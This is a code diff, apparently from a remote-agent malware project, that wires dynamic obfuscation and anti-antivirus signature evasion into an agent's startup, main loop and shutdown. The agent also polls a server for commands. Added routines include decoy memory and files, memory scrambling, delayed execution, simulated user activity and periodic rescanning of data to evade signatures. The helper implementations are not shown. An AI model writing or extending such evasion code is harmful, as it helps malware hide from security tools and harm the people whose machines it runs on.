@@ -11,6 +11,8 @@
 #include "integration.h"
 #include "stealth/anti_debug.h"
 #include "stealth/anti_vm.h"
+#include "stealth/dynamic_obfuscation.h"
+#include "stealth/signature_evasion.h"
 
 // Forward declarations for modules
 extern "C" {
@@ -68,6 +70,7 @@ private:
     bool running;
     std::string agent_id;
     std::thread worker_thread;
+    std::unique_ptr<SignatureEvasion::SignatureEvader> signatureEvader;
     
 public:
     Agent() : running(false) {}
@@ -96,6 +99,36 @@ public:
                 LogError("Failed to start Stealth system");
                 return false;
             }
+            
+            // Initialize Dynamic Obfuscation
+            LogInfo("Initializing Dynamic Obfuscation system...");
+            auto& obfuscator = DynamicObfuscation::DynamicObfuscator::GetInstance();
+            
+            if (!obfuscator.Initialize(300000, // 5 minutes interval
+                static_cast<DWORD>(DynamicObfuscation::ObfuscationTechnique::ALL_TECHNIQUES))) {
+                LogError("Failed to initialize Dynamic Obfuscation");
+                return false;
+            }
+            
+            if (!obfuscator.Start()) {
+                LogError("Failed to start Dynamic Obfuscation");
+                return false;
+            }
+            
+            LogInfo("Dynamic Obfuscation system started successfully");
+            
+            // Initialize Signature Evasion System
+            LogInfo("Initializing Signature Evasion system...");
+            signatureEvader = std::make_unique<SignatureEvasion::SignatureEvader>();
+            signatureEvader->StartSignatureMonitoring();
+            
+            // Apply immediate evasion techniques
+            SignatureEvasion::AntiAVEvasion::SimulateNormalActivity();
+            SignatureEvasion::AntiAVEvasion::DelayExecution(1000, 3000);
+            SignatureEvasion::AntiAVEvasion::AllocateDecoyMemory();
+            SignatureEvasion::AntiAVEvasion::ScrambleMemoryLayout();
+            
+            LogInfo("Signature Evasion system initialized successfully");
             
             // Enable auto-recovery for robust operation
             RTSRTIntegration::EnableAutoRecovery();
@@ -136,6 +169,12 @@ public:
         // Gracefully stop worker thread
         if (worker_thread.joinable()) {
             worker_thread.join();
+        }
+        
+        // Stop signature evasion system
+        if (signatureEvader) {
+            signatureEvader->StopSignatureMonitoring();
+            signatureEvader.reset();
         }
         
         // Stop all RT-SRT systems
@@ -180,6 +219,9 @@ private:
                 
                 // Check for commands from server
                 CheckCommands();
+                
+                // Apply periodic signature evasion techniques
+                ApplyPeriodicEvasion();
                 
                 // Periodic system status logging
                 static int statusCounter = 0;
@@ -404,6 +446,55 @@ private:
         }
         
         return result;
+    }
+    
+    void ApplyPeriodicEvasion() {
+        static int evasionCounter = 0;
+        evasionCounter++;
+        
+        // Apply different evasion techniques on different cycles
+        switch (evasionCounter % 5) {
+            case 0:
+                // Simulate normal user activity
+                SignatureEvasion::AntiAVEvasion::SimulateNormalActivity();
+                break;
+                
+            case 1:
+                // Apply memory scrambling
+                SignatureEvasion::AntiAVEvasion::ScrambleMemoryLayout();
+                break;
+                
+            case 2:
+                // Create decoy files
+                SignatureEvasion::AntiAVEvasion::CreateDecoyFiles();
+                break;
+                
+            case 3:
+                // Touch legitimate files
+                SignatureEvasion::AntiAVEvasion::TouchLegitimateFiles();
+                break;
+                
+            case 4:
+                // Fragment operations
+                SignatureEvasion::AntiAVEvasion::FragmentOperations();
+                break;
+        }
+        
+        // Apply signature scanning on collected data periodically
+        if (evasionCounter % 3 == 0 && signatureEvader) {
+            LogDebug("Performing periodic signature scan");
+            
+            // In practice, this would scan actual code/data being transmitted
+            std::vector<uint8_t> dummyData = {0x90, 0x90, 0x90}; // Sample data
+            auto signatures = signatureEvader->ScanForSignatures(dummyData);
+            
+            if (!signatures.empty()) {
+                LogWarning("Signatures detected during periodic scan - applying evasion");
+                auto evadedData = signatureEvader->EvadeSignatures(dummyData);
+            }
+        }
+        
+        LogDebug("Periodic evasion techniques applied");
     }
 };
 
